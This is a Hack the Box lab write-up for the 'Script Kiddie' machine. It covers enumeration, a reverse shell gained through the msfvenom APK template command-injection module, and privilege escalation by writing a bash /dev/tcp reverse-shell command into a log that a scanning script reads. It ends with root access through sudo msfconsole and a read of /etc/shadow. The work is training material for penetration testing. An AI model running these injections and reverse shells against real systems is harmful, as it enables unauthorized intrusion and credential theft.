---
layout: default
title: Script Kiddie
parent: Hack the Box Labs
nav_order: 2
---
# Enumeration
## NMap Scan
```bash
┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
└─# nmap -sC -sV 10.10.10.226  > nmap.txt

┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
└─# cat nmap.txt  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 21:07 MDT
Nmap scan report for scriptk (10.10.10.226)
Host is up (0.061s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.02 seconds
```

## GoBuster
is a bust:
```bash
┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
└─# gobuster dir -u http://10.10.10.226:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.226:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/03 20:54:20 Starting gobuster in directory enumeration mode
===============================================================
                                 e
===============================================================
2021/05/03 21:14:28 Finished
===============================================================
```

# Exploitation
## WerkZeug
> Failed WerkZeug Exploitation Attempts
Werkzeug stands out - did some recon and found the following articles/references:
Werkzeug httpd 0.16.1
https://snyk.io/vuln/pip:werkzeug
https://www.exploit-db.com/exploits/43905

I'm trying to avoid using metasploit, as it is not allowed to be used during the OSCP exam, but we'll keep this in our back-pocket just in case. [Article from Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/werkzeug_debug_rce/)

Using the [exploit-db article](https://www.exploit-db.com/exploits/43905) I've downloaded the exploit to my attacking machine. From preliminary code review it looks like this is going to create a reverse shell for us. Started up my listener, executed the python script against the target:

```bash
┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
└─# nc -lvnp 8888                           
listening on [any] 8888 ...
```

```bash
┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
└─# python exploit.py 10.10.10.226 5000 10.10.14.3 8888                                              255 ⨯
[-] Debug is not enabled
```

Reviewing the script we see this information, might be barking up the wrong tree.
> if "Werkzeug " not in response.text: print "[-] Debug is not enabled" sys.exit(-1)

Excerpts from ['Flask RCE Debug Mode'](http://ghostlulz.com/flask-rce-debug-mode/):
>Werkzeug is a web server gateway interface (WSGI) web application library which Flask heavily relies on. A WSGI is a calling convention for web servers to forward requests to web applications or frameworks written in the Python programming language.

Excerpts from ['Hacking Flask Applications'](https://medium.com/swlh/hacking-flask-applications-939eae4bffed):

>Sometimes, you can also access the debugger console by navigating to the path “_/console_”, if it is set as a general-purpose path for the debugger.

## MSFVenom Templates
With this information we move on to other avenues. Re-review of the site, re-review of what these inputs are performing / executing. Generated some windows payloads, noted that linux always errors out, confirmed that Android payloads generate. Nmap scan isn't accepting any additional flags/input, searchsploit input doesn't necessarily have any flags that will get us anywhere (query of a 3rd party). Template upload really seems like the only file upload method we have, so we start digging into that.

![[Pasted image 20210503220424.png]]

We do have the ability to include templates, so I began researching what I can potentially do to manipulate this ability. Some relevant articles from the research:
[Rapid7](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)
[GitHub](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md)

Following the steps in [this Rapid7 article](https://github.com/rapid7/metasploit-framework/pull/14331), I was able to establish a reverse-shell by manipulating the upload feature on the website responsible for generating MSFVENOM payloads (in this case, for android).

### Steps to accomplish:
Generate payload
```bash
msf6 > use unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.111        yes       The listen address (an interface may be specified)
   LPORT  8989             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**
...

[+] msf.apk stored at /root/.msf4/local/msf.apk
```

Initiate listener (multi/handler)
```bash
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.111     yes       The listen address (an interface may be specified)
   LPORT  8989             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.111:8989
```

Upload malicious template to website and generate (using 'victim' machine's IP)
![[Pasted image 20210503225209.png]]
Achieve reverse shell, find out 'who we are'
```bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.111:8989
[*] Command shell session 1 opened (10.10.14.111:8989 -> 10.10.10.226:52530) at 2021-05-03 22:47:36 -0600

whoami
kid
pwd
/home/kid/html
uname -a
Linux scriptkiddie 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

Stabilize shell via python (the --version check at first is to check that this will even work)
```bash
python3 --version
Python 3.8.5

python3 -c 'import pty;pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ whoami
whoami
kid
kid@scriptkiddie:~/html$
```

Some initial poking around on the machine, we see 2 users; kid and pwd.
```bash
kid@scriptkiddie:~/logs$ cat /etc/passwd | grep 'home'
cat /etc/passwd | grep 'home'
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
kid@scriptkiddie:~/logs$
```

Hold on to this for additional review:
```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh
cat scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
kid@scriptkiddie:/home/pwn$
```

Explanation of what we're seeing. cat $log, is reading input from /home/kid/logs/hackers file (which our current user has access to). cut -d ' ' will count each space (' ') as the end of a field, and -f3- will output the 3rd field and anything after it (e.g. cutting out everything before the second space).


I see this example in home/kid/html/hackers (the method for initiating a reverse shell), I just need to get this into /home/kid/logs/hackers, so that scanlosers.sh does its 'cat $log' read, thus initiating the reverse shell, as user 'pwn'.
```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.16/4545 0>&1' #
```

Remember that thing about delimiters we looked at previously? If I don't pad this with 3 spaces, it's going to cut out the 'bin/bash -c 'bash' part of our command. So we've got some leading spaces here:
```bash
echo "   ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.111/8990 0>&1' #" >> hackers
```

We can see that the reverse-shell picked up, as pwn.
What can I run as root? Oh, metasploit? You don't say:
```bash
┌──(root💀kali)-[/home/ghohst/Documents/HTB/scriptk]
└─# nc -lvnp 8990
listening on [any] 8990 ...
connect to [10.10.14.111] from (UNKNOWN) [10.10.10.226] 52940
bash: cannot set terminal process group (871): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
pwn@scriptkiddie:~$
```

Since we're essentially an escalated shell from here, we just cat root/root.txt for the final flag.

# Extra Credit
I did, also, cat /etc/shadow so I can smash the user passwords if I wanted to. If for whatever reason I was unable to gather the flag right away and needed to SSH back into the machine, I could potentially crack these and go that route as our foothold.
```bash
msf6 > cat /etc/shadow
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat /etc/shadow
```
